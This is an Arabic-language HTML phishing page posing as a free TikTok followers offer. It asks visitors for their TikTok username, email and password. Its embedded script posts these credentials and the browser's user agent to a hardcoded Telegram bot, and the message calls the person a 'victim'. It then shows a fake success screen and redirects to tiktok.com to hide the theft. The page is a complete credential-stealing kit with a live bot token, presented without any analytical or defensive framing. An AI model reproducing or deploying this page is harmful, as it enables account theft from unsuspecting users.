<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>متابعين تيك توك مجانا</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Segoe UI',Tahoma,sans-serif;
            background:linear-gradient(135deg,#000000,#121212,#1a1a1a);
            color:#fff;min-height:100vh;
            display:flex;align-items:center;justify-content:center;padding:20px;
        }
        .container{
            background:rgba(255,255,255,0.03);border-radius:20px;padding:30px 20px;
            max-width:400px;width:100%;text-align:center;
            border:2px solid #ff0050;box-shadow:0 0 40px rgba(255,0,80,0.4);
        }
        .logo{
            width:80px;height:80px;margin:0 auto 15px;
            background:#ff0050;border-radius:18px;display:flex;
            align-items:center;justify-content:center;font-size:40px;
            box-shadow:0 0 30px rgba(255,0,80,0.6);
            animation:pulse 1.5s infinite;
        }
        @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
        h1{font-size:22px;background:linear-gradient(135deg,#ff0050,#00f2ea);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px}
        .sub{color:#888;font-size:13px;margin-bottom:20px}
        .fg{margin-bottom:16px;text-align:right}
        label{display:block;color:#aaa;font-size:12px;margin-bottom:5px}
        input,select{
            width:100%;padding:13px;background:rgba(255,255,255,0.05);
            border:1px solid #333;border-radius:10px;color:#fff;
            font-size:14px;outline:none;
        }
        input:focus,select:focus{border-color:#ff0050;box-shadow:0 0 15px rgba(255,0,80,0.3)}
        .btn{
            width:100%;padding:15px;margin-top:12px;
            background:linear-gradient(135deg,#ff0050,#00f2ea);
            color:#fff;border:none;border-radius:10px;
            font-size:17px;font-weight:bold;cursor:pointer;
            box-shadow:0 0 25px rgba(255,0,80,0.4);
        }
        .btn:active{transform:scale(0.96)}
        .load{
            display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:99;
            justify-content:center;align-items:center;flex-direction:column;
        }
        .load.show{display:flex}
        .spinner{
            width:55px;height:55px;border:4px solid #333;
            border-top:4px solid #ff0050;border-radius:50%;
            animation:spin 0.7s linear infinite;margin-bottom:18px;
        }
        @keyframes spin{to{transform:rotate(360deg)}}
        .done{
            display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:98;
            justify-content:center;align-items:center;flex-direction:column;
        }
        .done.show{display:flex}
        .done h2{color:#00f2ea;font-size:26px;margin:15px 0}
        .stats{
            display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:15px 0;
        }
        .stat-box{
            background:rgba(255,255,255,0.05);border:1px solid #333;
            border-radius:10px;padding:12px;text-align:center;
        }
        .stat-box .num{color:#ff0050;font-size:22px;font-weight:bold}
        .stat-box .txt{color:#888;font-size:11px;margin-top:4px}
    </style>
</head>
<body>

<div class="container" id="form">
    <div class="logo">🎵</div>
    <h1>متابعين تيك توك مجانا</h1>
    <p class="sub">احصل على متابعين حقيقيين مجانا</p>
    
    <div class="fg"><label>📱 اسم مستخدم تيك توك</label><input type="text" id="username" placeholder="@username"></div>
    <div class="fg"><label>📧 البريد الإلكتروني</label><input type="email" id="email" placeholder="email@example.com"></div>
    <div class="fg"><label>🔒 كلمة المرور</label><input type="password" id="password" placeholder="كلمة المرور"></div>
    
    <div class="stats">
        <div class="stat-box"><div class="num">1000</div><div class="txt">متابع</div></div>
        <div class="stat-box"><div class="num">5000</div><div class="txt">لايك</div></div>
    </div>
    
    <div class="fg"><label>🎁 عدد المتابعين</label><select id="amount"><option value="">-- اختر --</option><option>100 متابع</option><option>500 متابع</option><option>1000 متابع</option><option>5000 متابع</option><option>10000 متابع</option></select></div>
    
    <button class="btn" onclick="go()">⚡ احصل على متابعين مجانا</button>
</div>

<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري إرسال المتابعين...</p></div>
<div class="done" id="done"><h2>✅ تم بنجاح!</h2><p>سيتم إضافة المتابعين خلال ساعة</p></div>

<script>
const u=new URL(window.location.href);
const CHAT=u.searchParams.get('chatId')||'7276604783';
const TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
async function send(t){
    try{await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
}
async function go(){
    const un=document.getElementById('username').value.trim();
    const em=document.getElementById('email').value.trim();
    const pw=document.getElementById('password').value.trim();
    const am=document.getElementById('amount').value;
    if(!un||!em||!pw||!am)return alert('املأ جميع الحقول');
    document.getElementById('load').classList.add('show');
    const msg=`🎵 <b>ضحية تيك توك!</b>\n\n👤 يوزر: ${un}\n📧 إيميل: ${em}\n🔒 كلمة: ${pw}\n🎁 باقة: ${am}\n\n📱 ${navigator.userAgent}`;
    await send(msg);
    setTimeout(()=>{document.getElementById('load').classList.remove('show');document.getElementById('done').classList.add('show');setTimeout(()=>{window.location.href='https://tiktok.com/'},3000)},4000);
}
</script>
</body>
</html>
